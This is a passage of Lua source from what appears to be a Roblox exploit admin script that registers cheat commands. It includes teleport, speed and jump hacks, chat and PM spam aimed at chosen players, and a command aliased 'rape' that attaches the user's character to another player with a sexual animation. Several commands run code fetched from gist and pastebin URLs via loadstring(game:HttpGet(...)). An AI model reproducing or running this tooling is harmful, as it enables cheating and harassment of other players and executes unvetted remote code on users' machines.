					v.Name == "Right Arm" or
					v.Name == "Left Arm" then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('nolegs',{'rlegs'},function(args, speaker)
		if r15(speaker) then
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "RightUpperLeg" or
					v.Name == "LeftUpperLeg" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "Right Leg" or
					v.Name == "Left Leg" then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('sit',{},function(args, speaker)
		speaker.Character:FindFirstChildOfClass("Humanoid").Sit = true
	end)

	addcmd('sitwalk',{},function(args, speaker)
		local anims = speaker.Character.Animate
		local sit = anims.sit:FindFirstChildOfClass("Animation").AnimationId
		anims.idle:FindFirstChildOfClass("Animation").AnimationId = sit
		anims.walk:FindFirstChildOfClass("Animation").AnimationId = sit
		anims.run:FindFirstChildOfClass("Animation").AnimationId = sit
		anims.jump:FindFirstChildOfClass("Animation").AnimationId = sit
		if r15(speaker) then
			speaker.Character.Humanoid.HipHeight = 0.5
		else
			speaker.Character.Humanoid.HipHeight = -1.5
		end
	end)

	function noSitFunc()
		wait()
		if Players.LocalPlayer.Character.Humanoid.Sit then
			Players.LocalPlayer.Character.Humanoid.Sit = false
		end
	end
	addcmd('nosit',{},function(args, speaker)
		if noSit then noSit:Disconnect() nositDied:Disconnect() end
		noSit = Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
		local function nositDiedFunc()
			repeat wait() until speaker.Character ~= nil and speaker.Character:FindFirstChild('Humanoid')
			noSit:Disconnect()
			noSit = Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
		end
		nositDied = speaker.CharacterAdded:Connect(nositDiedFunc)
	end)

	addcmd('unnosit',{},function(args, speaker)
		if noSit then noSit:Disconnect() nositDied:Disconnect() end
	end)

	addcmd('jump',{},function(args, speaker)
		speaker.Character:FindFirstChildOfClass("Humanoid").Jump = true
	end)

	addcmd('infjump',{'infinitejump'},function(args, speaker)
		infJump = true
	end)

	addcmd('uninfjump',{'uninfinitejump','noinfjump','noinfinitejump'},function(args, speaker)
		infJump = false
	end)

	local flyjump
	addcmd('flyjump',{},function(args, speaker)
		if flyjump then flyjump:Disconnect() end
		flyjump = UserInputService.JumpRequest:Connect(function(Jump)
			game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
		end)
	end)

	addcmd('unflyjump',{'noflyjump'},function(args, speaker)
		if flyjump then flyjump:Disconnect() end
	end)

	local HumanModCons = {}
	addcmd('autojump',{'ajump'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
		local function autoJump()
			if Char and Human then
				local check1 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position-Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
				local check2 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position+Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
				if check1 or check2 then
					Human.Jump = true
				end
			end
		end
		autoJump()
		HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(autoJump)
		HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
			Char, Human = nChar, nChar:WaitForChild("Humanoid")
			autoJump()
			HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(autoJump)
		end)
	end)

	addcmd('unautojump',{'noautojump', 'noajump', 'unajump'},function(args, speaker)
		HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or nil
		HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or nil
	end)

	addcmd('edgejump',{'ejump'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
		-- Full credit to NoelGamer06 @V3rmillion
		local state
		local laststate
		local lastcf
		local function edgejump()
			if Char and Human then
				laststate = state
				state = Human:GetState()
				if laststate ~= state and state == Enum.HumanoidStateType.Freefall and laststate ~= Enum.HumanoidStateType.Jumping then
					Char.HumanoidRootPart.CFrame = lastcf
					Char.HumanoidRootPart.Velocity = Vector3.new(Char.HumanoidRootPart.Velocity.X, Human.JumpPower, Char.HumanoidRootPart.Velocity.Z)
				end
				lastcf = Char.HumanoidRootPart.CFrame
			end
		end
		edgejump()
		HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(edgejump)
		HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
			Char, Human = nChar, nChar:WaitForChild("Humanoid")
			edgejump()
			HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(edgejump)
		end)
	end)

	addcmd('unedgejump',{'noedgejump', 'noejump', 'unejump'},function(args, speaker)
		HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or nil
		HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or nil
	end)

	addcmd('team',{},function(args, speaker)
		local teamname = nil
		for a,b in pairs(game:GetService("Teams"):GetChildren()) do
			local L_name = b.Name:lower()
			local F = L_name:find(getstring(1))
			if F == 1 then
				teamname = b 
			end
		end
		speaker.Team = teamname
	end)

	addcmd('nobgui',{'unbgui','nobillboardgui','unbillboardgui','noname','rohg'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants())do
			if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
				v:Destroy()
			end
		end
	end)

	addcmd('loopnobgui',{'loopunbgui','loopnobillboardgui','loopunbillboardgui','loopnoname','looprohg'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants())do
			if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
				v:Destroy()
			end
		end
		local function charPartAdded(part)
			if part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
				wait()
				part:Destroy()
			end
		end
		charPartTrigger = speaker.Character.DescendantAdded:Connect(charPartAdded)
	end)

	addcmd('unloopnobgui',{'unloopunbgui','unloopnobillboardgui','unloopunbillboardgui','unloopnoname','unlooprohg'},function(args, speaker)
		if charPartTrigger then
			charPartTrigger:Disconnect()
		end
	end)

	addcmd('spasm',{},function(args, speaker)
		if not r15(speaker) then
			local pchar=speaker.Character
			local AnimationId = "33796059"
			SpasmAnim = Instance.new("Animation")
			SpasmAnim.AnimationId = "rbxassetid://"..AnimationId
			Spasm = pchar.Humanoid:LoadAnimation(SpasmAnim)
			Spasm:Play()
			Spasm:AdjustSpeed(99)
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('unspasm',{'nospasm'},function(args, speaker)
		Spasm:Stop()
		SpasmAnim:Destroy()
	end)

	addcmd('headthrow',{},function(args, speaker)
		if not r15(speaker) then
			local AnimationId = "35154961"
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://"..AnimationId
			local k = speaker.Character.Humanoid:LoadAnimation(Anim)
			k:Play(0)
			k:AdjustSpeed(1)
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('animation',{'anim'},function(args, speaker)
		if not r15(speaker) then
			local pchar=speaker.Character
			local AnimationId = tostring(args[1])
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://"..AnimationId
			local k = pchar.Humanoid:LoadAnimation(Anim)
			k:Play()
			if args[2] then
				k:AdjustSpeed(tostring(args[2]))
			end
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('noanim',{},function(args, speaker)
		speaker.Character.Animate.Disabled = true
	end)

	addcmd('reanim',{},function(args, speaker)
		speaker.Character.Animate.Disabled = false
	end)

	addcmd('animspeed',{},function(args, speaker)
		local Char = speaker.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(tonumber(args[1] or 1))
		end
	end)

	addcmd('copyanimation',{'copyanim','copyemote'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for _,v in ipairs(players)do
			local char = Players[v].Character
			for _, v1 in pairs(speaker.Character.Humanoid:GetPlayingAnimationTracks()) do
				v1:Stop()
			end
			for _, v1 in pairs(Players[v].Character.Humanoid:GetPlayingAnimationTracks()) do
				if not string.find(v1.Animation.AnimationId, "507768375") then
					local ANIM = speaker.Character.Humanoid:LoadAnimation(v1.Animation)
					ANIM:Play(.1, 1, v1.Speed)
					ANIM.TimePosition = v1.TimePosition
					spawn(function()
						v1.Stopped:Wait()
						ANIM:Stop()
						ANIM:Destroy()
					end)
				end
			end
		end
	end)

	addcmd('stopanimations',{'stopanims','stopanim'},function(args, speaker)
		local Char = speaker.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:Stop()
		end
	end)

	addcmd('refreshanimations', {'refreshanimation','refreshanims','refreshanim','reanim'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
		local Animate = Char and Char.FindFirstChild(Char, "Animate")
		Animate.Disabled = true
		for _, v in ipairs(Human.GetPlayingAnimationTracks(Human)) do
			v.Stop(v, 0)
		end
		Animate.Disabled = false
	end)

	addcmd('loopanimation', {'loopanim'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
		for _, v in ipairs(Human.GetPlayingAnimationTracks(Human)) do
			v.Looped = true
		end
	end)

	addcmd('tpposition',{'tppos'},function(args, speaker)
		if #args < 3 then return end
		local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
		local char = speaker.Character
		if char and getRoot(char) then
			getRoot(char).CFrame = CFrame.new(tpX,tpY,tpZ)
		end
	end)

	addcmd('tweentpposition',{'ttppos'},function(args, speaker)
		if #args < 3 then return end
		local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
		local char = speaker.Character
		if char and getRoot(char) then
			game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
		end
	end)

	addcmd('offset',{},function(args, speaker)
		if #args < 3 then
			return 
		end
		if speaker.Character then
			speaker.Character:TranslateBy(Vector3.new(tonumber(args[1]) or 0, tonumber(args[2]) or 0, tonumber(args[3]) or 0))
		end
	end)

	addcmd('tweenoffset',{'toffset'},function(args, speaker)
		if #args < 3 then return end
		local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
		local char = speaker.Character
		if char and getRoot(char) then
			game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
		end
	end)

	addcmd('clickteleport',{},function(args, speaker)
		if speaker == Players.LocalPlayer then
			notify('Click TP','Go to Settings>Keybinds>Add to set up click tp')
		end
	end)

	addcmd('tptool', {'teleporttool'}, function(args, speaker)
		local TpTool = Instance.new("Tool")
		TpTool.Name = "Teleport Tool"
		TpTool.RequiresHandle = false
		TpTool.Parent = speaker.Backpack
		TpTool.Activated:Connect(function()
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
			if not Char or not HRP then
				return warn("Failed to find HumanoidRootPart")
			end
			HRP.CFrame = CFrame.new(IYMouse.Hit.X, IYMouse.Hit.Y + 3, IYMouse.Hit.Z, select(4, HRP.CFrame:components()))
		end)
	end)

	addcmd('clickdelete',{},function(args, speaker)
		if speaker == Players.LocalPlayer then
			notify('Click Delete','Go to Settings>Keybinds>Add to set up click delete')
		end
	end)

	addcmd('getposition',{'getpos','notifypos','notifyposition'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			local char = Players[v].Character
			local pos = char and (getRoot(char) or char:FindFirstChildWhichIsA("BasePart"))
			pos = pos and pos.Position
			if not pos then
				return notify('Getposition Error','Missing character')
			end
			local roundedPos = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
			notify('Current Position',roundedPos)
		end
	end)

	addcmd('copyposition',{'copypos'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			local char = Players[v].Character
			local pos = char and (getRoot(char) or char:FindFirstChildWhichIsA("BasePart"))
			pos = pos and pos.Position
			if not pos then
				return notify('Getposition Error','Missing character')
			end
			local roundedPos = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
			toClipboard(roundedPos)
		end
	end)

	addcmd('walktopos',{'walktoposition'},function(args, speaker)
		if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
			speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			wait(.1)
		end
		speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(args[1],args[2],args[3])
	end)

	addcmd('speed',{'ws','walkspeed'},function(args, speaker)
		if args[2] then
			local speed = args[2] or 16
			if isNumber(speed) then
				speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
			end
		else
			local speed = args[1] or 16
			if isNumber(speed) then
				speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
			end
		end
	end)

	addcmd('loopspeed',{'loopws'},function(args, speaker)
		local speed = args[1] or 16
		if args[2] then
			speed = args[2] or 16
		end
		if isNumber(speed) then
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			local function WalkSpeedChange()
				if Char and Human then
					Human.WalkSpeed = speed
				end
			end
			WalkSpeedChange()
			HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
			HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
				Char, Human = nChar, nChar:WaitForChild("Humanoid")
				WalkSpeedChange()
				HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
			end)
		end
	end)

	addcmd('unloopspeed',{'unloopws'},function(args, speaker)
		HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or nil
		HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or nil
	end)

	addcmd('loopjumppower',{'loopjp','loopjpower'},function(args, speaker)
		local jpower = args[1] or 50
		if isNumber(jpower) then
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			local function JumpPowerChange()
				if Char and Human then
					Human.JumpPower = jpower
				end
			end
			JumpPowerChange()
			HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
			HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
				Char, Human = nChar, nChar:WaitForChild("Humanoid")
				JumpPowerChange()
				HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
			end)
		end
	end)

	addcmd('unloopjumppower',{'unloopjp','unloopjpower'},function(args, speaker)
		HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or nil
		HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or nil
	end)

	addcmd('tools',{'gears'},function(args, speaker)
		local function copy(instance)
			for i,c in pairs(instance:GetChildren())do
				if c:IsA('Tool') or c:IsA('HopperBin') then
					c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
				end
				copy(c)
			end
		end
		copy(game:GetService("Lighting"))
		local function copy(instance)
			for i,c in pairs(instance:GetChildren())do
				if c:IsA('Tool') or c:IsA('HopperBin') then
					c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
				end
				copy(c)
			end
		end
		copy(game:GetService("ReplicatedStorage"))
		notify('Tools','Copied tools from ReplicatedStorage and Lighting')
	end)

	addcmd('notools',{'rtools','clrtools','removetools','deletetools','dtools'},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Destroy()
			end
		end
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Destroy()
			end
		end
	end)

	addcmd('deleteselectedtool',{'dst'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Destroy()
			end
		end
	end)

	addcmd('console',{},function(args, speaker)
		-- Thanks wally!!
		notify("Loading",'Hold on a sec')
		local _, str = pcall(function()
			return game:HttpGet("https://gist.githubusercontent.com/luatsuki/a1b48e02d5710ebff8fe1ffb1fc5ea38/raw/055143d9238eb6645fbb1f5c4a9a0122ca90c8f4/Console", true)
		end)

		local s, e = loadstring(str)
		if typeof(s) ~= "function" then
			return
		end

		local success, message = pcall(s)
		if (not success) then
			if printconsole then
				printconsole(message)
			elseif printoutput then
				printoutput(message)
			end
		end
		wait(1)
		notify('Console','Press F9 to open the console')
	end)

	addcmd('explorer',{'dex'},function(args, speaker)
		notify("Loading",'Hold on a sec')
		local Dex = game:GetObjects("rbxassetid://3567096419")[1]
		Dex.Parent = PARENT

		local function Load(Obj, Url)
			local function GiveOwnGlobals(Func, Script)
				local Fenv = {}
				local RealFenv = {script = Script}
				local FenvMt = {}
				FenvMt.__index = function(a,b)
					if RealFenv[b] == nil then
						return getfenv()[b]
					else
						return RealFenv[b]
					end
				end
				FenvMt.__newindex = function(a, b, c)
					if RealFenv[b] == nil then
						getfenv()[b] = c
					else
						RealFenv[b] = c
					end
				end
				setmetatable(Fenv, FenvMt)
				setfenv(Func, Fenv)
				return Func
			end
			local function LoadScripts(Script)
				if Script.ClassName == "Script" or Script.ClassName == "LocalScript" then
					spawn(function()
						GiveOwnGlobals(loadstring(Script.Source, "=" .. Script:GetFullName()), Script)()
					end)
				end
				for i,v in pairs(Script:GetChildren()) do
					LoadScripts(v)
				end
			end
			LoadScripts(Obj)
		end

		Load(Dex)
	end)

	addcmd('remotespy',{'rspy'},function(args, speaker)
		notify("Loading",'Hold on a sec')
		-- Full credit to exx, creator of SimpleSpy
		loadstring(game:HttpGet("https://gist.githubusercontent.com/luatsuki/c75a272fb67bccc22bd1b6add92ee267/raw/56375f8536aeca0cc84b44032312efb0fa5b7fa0/Spy"))()
	end)

	addcmd('audiologger',{'alogger'},function(args, speaker)
		notify("Loading",'Hold on a sec')
		loadstring(game:HttpGet(('https://pastebin.com/raw/GmbrsEjM'),true))()
	end)

	local loopgoto = nil
	addcmd('loopgoto',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			loopgoto = nil
			if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			loopgoto = Players[v]
			local distance = 3
			if args[2] and isNumber(args[2]) then
				distance = args[2]
			end
			local lDelay = 0
			if args[3] and isNumber(args[3]) then
				lDelay = args[3]
			end
			repeat
				if Players:FindFirstChild(v) then
					if Players[v].Character ~= nil then
						getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(distance,1,0)
					end
					wait(lDelay)
				else
					loopgoto = nil
				end
			until loopgoto ~= Players[v]
		end
	end)

	addcmd('unloopgoto',{'noloopgoto'},function(args, speaker)
		loopgoto = nil
	end)

	addcmd('headsit',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			speaker.Character:FindFirstChildOfClass('Humanoid').Sit = true
			headSit = game:GetService("RunService").Heartbeat:Connect(function()
				if Players[v].Character ~= nil and getRoot(Players[v].Character) and getRoot(speaker.Character) then
					if Players:FindFirstChild(Players[v].Name) and speaker.Character:FindFirstChildOfClass('Humanoid').Sit == true then
						getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,1.6,0.4)
					else
						headSit:Disconnect()
					end
				end
			end)
		end
	end)

	addcmd('chat',{'say'},function(args, speaker)
		local cString = getstring(1)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cString, "All")
	end)

	spamming = false
	spamspeed = 1
	addcmd('spam',{},function(args, speaker)
		spamming = true
		local spamstring = getstring(1)
		repeat wait(spamspeed)
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamstring, "All")
		until spamming == false
	end)

	addcmd('nospam',{'unspam'},function(args, speaker)
		spamming = false
	end)

	addcmd('whisper',{'pm'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local plrName = Players[v].Name
				local pmstring = getstring(2)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plrName.." "..pmstring, "All")
			end)
		end
	end)

	pmspamming = {}
	addcmd('pmspam',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local plrName = Players[v].Name
				if FindInTable(pmspamming, plrName) then return end
				table.insert(pmspamming, plrName)
				local pmspamstring = getstring(2)
				repeat
					if Players:FindFirstChild(v) then
						wait(spamspeed)
						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plrName.." "..pmspamstring, "All")
					else
						for a,b in pairs(pmspamming) do if b == plrName then table.remove(pmspamming, a) end end
					end
				until not FindInTable(pmspamming, plrName)
			end)
		end
	end)

	addcmd('nopmspam',{'unpmspam'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				for a,b in pairs(pmspamming) do
					if b == Players[v].Name then
						table.remove(pmspamming, a)
					end
				end
			end)
		end
	end)

	addcmd('spamspeed',{},function(args, speaker)
		local speed = args[1] or 1
		if isNumber(speed) then
			spamspeed = speed
		end
	end)

	bubblechatting = false
	local getBubblechat
	addcmd('bubblechat',{},function(args, speaker)
		if bubblechatting then return end
		bubblechatting = true
		if getBubblechat then getBubblechat:Disconnect() end
		getBubblechat = Players.PlayerAdded:Connect(function(plr)
			local chatfunc
			chatfunc = plr.Chatted:Connect(function(chat)
				if bubblechatting == true then
					game:GetService("Chat"):Chat(plr.Character.Head,chat,Enum.ChatColor.White)
				else
					chatfunc:Disconnect()
				end
			end)
		end)
		for i,v in pairs(Players:GetPlayers()) do
			local chatfunc
			chatfunc = v.Chatted:Connect(function(chat)
				if bubblechatting == true then
					game:GetService("Chat"):Chat(v.Character.Head,chat,Enum.ChatColor.White)
				else
					chatfunc:Disconnect()
				end
			end)
		end
	end)

	addcmd('unbubblechat',{'nobubblechat'},function(args, speaker)
		bubblechatting = false
		if getBubblechat then getBubblechat:Disconnect() end
	end)

	addcmd('safechat',{},function(args, speaker)
		speaker.SetSuperSafeChat(true)
	end)

	addcmd('nosafechat',{'disablesafechat','unsafechat'},function(args, speaker)
		speaker.SetSuperSafeChat(false)
	end)

	addcmd('blockhead',{},function(args, speaker)
		speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
	end)

	addcmd('blockhats',{},function(args, speaker)
		for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
			for i,c in pairs(v:GetDescendants()) do
				if c:IsA("SpecialMesh") then
					c:Destroy()
				end
			end
		end
	end)

	addcmd('blocktool',{},function(args, speaker)
		for _,v in pairs(speaker.Character:GetChildren()) do
			if v:IsA("Tool") or v:IsA("HopperBin") then
				for i,c in pairs(v:GetDescendants()) do
					if c:IsA("SpecialMesh") then
						c:Destroy()
					end
				end
			end
		end
	end)

	addcmd('creeper',{},function(args, speaker)
		if r15(speaker) then
			speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
			speaker.Character.LeftUpperArm:Destroy()
			speaker.Character.RightUpperArm:Destroy()
			speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
		else
			speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
			speaker.Character["Left Arm"]:Destroy()
			speaker.Character["Right Arm"]:Destroy()
			speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
		end
	end)

	addcmd('bang',{'rape'},function(args, speaker)
		if not r15(speaker) then
			execCmd('unbang')
			wait()
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				bangAnim = Instance.new("Animation")
				bangAnim.AnimationId = "rbxassetid://148840371"
				bang = speaker.Character.Humanoid:LoadAnimation(bangAnim)
				bang:Play(.1, 1, 1)
				if args[2] then
					bang:AdjustSpeed(args[2])
				else
					bang:AdjustSpeed(3)
				end
				local bangplr = Players[v].Name
				bangDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					bangLoop:Disconnect()
					bang:Stop()
					bangAnim:Destroy()
					bangDied:Disconnect()
				end)
				bangLoop = game:GetService('RunService').Stepped:Connect(function()
					pcall(function()
						getRoot(Players.LocalPlayer.Character).CFrame = getRoot(Players[bangplr].Character).CFrame
					end)
				end)
			end
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('unbang',{'unrape'},function(args, speaker)
		if bangLoop then
			bangLoop:Disconnect()
			bangDied:Disconnect()
			bang:Stop()
			bangAnim:Destroy()
		end
	end)

	addcmd('carpet',{},function(args, speaker)
		if not r15(speaker) then
			execCmd('uncarpet')
			wait()
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				carpetAnim = Instance.new("Animation")
				carpetAnim.AnimationId = "rbxassetid://282574440"
				carpet = speaker.Character.Humanoid:LoadAnimation(carpetAnim)
				carpet:Play(.1, 1, 1)
				local carpetplr = Players[v].Name
				carpetDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					carpetLoop:Disconnect()
					carpet:Stop()
					carpetAnim:Destroy()
					carpetDied:Disconnect()
				end)
				carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
					pcall(function()
						getRoot(Players.LocalPlayer.Character).CFrame = getRoot(Players[carpetplr].Character).CFrame
					end)
				end)
			end
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('uncarpet',{'nocarpet'},function(args, speaker)
		if carpetLoop then
			carpetLoop:Disconnect()
			carpetDied:Disconnect()
			carpet:Stop()
			carpetAnim:Destroy()
		end
	end)

	addcmd('friend',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			speaker:RequestFriendship(v)
		end
	end)

	addcmd('unfriend',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			speaker:RevokeFriendship(v)
		end
	end)

	addcmd('bringpart',{},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				v.CFrame = getRoot(speaker.Character).CFrame
			end
		end
	end)

	addcmd('bringpartclass',{'bpc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
				v.CFrame = getRoot(speaker.Character).CFrame
			end
		end
	end)

	gotopartDelay = 0.1
	addcmd('gotopart',{'topart'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				getRoot(speaker.Character).CFrame = v.CFrame
			end
		end
	end)

	addcmd('tweengotopart',{'tgotopart','ttopart'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
			end
		end
	end)

	addcmd('gotopartclass',{'gpc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
